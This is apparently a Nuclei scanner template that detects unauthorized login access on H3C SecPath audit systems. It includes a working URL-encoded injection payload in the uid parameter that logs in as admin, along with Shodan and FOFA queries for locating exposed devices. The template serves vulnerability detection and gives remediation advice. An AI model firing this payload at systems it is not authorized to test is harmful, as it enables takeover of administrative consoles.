id: unauthorized-h3csecparh-login

info:
  name: H3C SecPath 登录接口未授权访问
  author: ritikchaddha
  severity: high
  description: |-
    该模板用于核查 H3C SecPath 登录接口未授权访问。目标管理界面、控制台或敏感接口在未登录状态下可访问，通常源于默认开放、反向代理绕过、初始化流程遗留或访问控制配置错误。模板访问 /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin，并根据页面标题、接口响应、重定向或关键业务字段确认未授权访问。
  classification:
    cpe: cpe:2.3:h:h3c:secpath_f5060:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: h3c
    product: secpath_f5060
    shodan-query: http.html:"H3C-SecPath-运维审计系统"
    fofa-query: app="H3C-SecPath-运维审计系统" && body="2018"
  tags: h3c,default-login,unauth,misconfig,vuln
  impact: |-
    - 攻击者可查看或操作管理功能、任务队列、监控数据、配置项、项目数据或设备状态。
    - 若界面提供写入、执行、上传或注册能力，可能进一步造成服务接管、数据泄露或业务中断。
  remediation: |-
    - 为管理入口和 API 强制启用认证授权，关闭匿名访问、访客登录和公开注册。
    - 将控制台限制在内网、VPN 或可信来源，并在网关层增加访问控制。
    - 复核默认配置、反向代理规则和初始化状态，清理测试账户并开启审计日志。
http:
  - method: GET
    path:
      - "{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "admin"
          - "审计管理员"
          - "错误的id"
        condition: and

      - type: status
        status:
          - 200
